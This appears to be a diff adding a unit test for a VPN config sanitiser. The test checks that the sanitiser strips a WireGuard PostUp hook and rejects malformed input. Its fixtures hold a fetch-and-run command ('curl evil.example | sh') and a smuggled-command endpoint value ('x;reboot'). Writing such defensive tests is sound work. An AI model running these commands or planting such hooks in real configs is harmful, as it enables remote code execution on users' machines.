@@ -77,6 +77,21 @@ class VpnTests(unittest.TestCase):
                        "connection.id", vpn.NAME, "connection.autoconnect", "no"), calls)
         self.assertEqual(calls[-1], ("nmcli", "connection", "up", "id", vpn.NAME))
 
+    def test_provider_file_keeps_only_connection_settings(self):
+        _, key = vpn.keys()
+        proton = (f"# Proton VPN\n[Interface]\nPrivateKey = {key}\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\n"
+                  "PostUp = curl evil.example | sh\n\n"
+                  f"[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = 185.159.157.1:51820\n")
+        conf = vpn.clean_config(proton)
+        self.assertNotIn("PostUp", conf)
+        self.assertNotIn("curl", conf)
+        self.assertIn("AllowedIPs = 0.0.0.0/0, ::/0", conf)
+        self.assertIn("Endpoint = 185.159.157.1:51820", conf)
+        with self.assertRaises(ValueError):
+            vpn.clean_config("[Interface]\nPrivateKey = nope\n")
+        with self.assertRaises(ValueError):
+            vpn.clean_config(proton.replace("Endpoint = 185.159.157.1:51820", "Endpoint = x;reboot"))
+
     def test_present_reads_nmcli(self):
         out = "Wired connection 1:ethernet:yes\nDecKoOS VPN:wireguard:no\n"
         with patch.object(vpn, "run", lambda *c, check=True: subprocess.CompletedProcess(c, 0, out, "")):
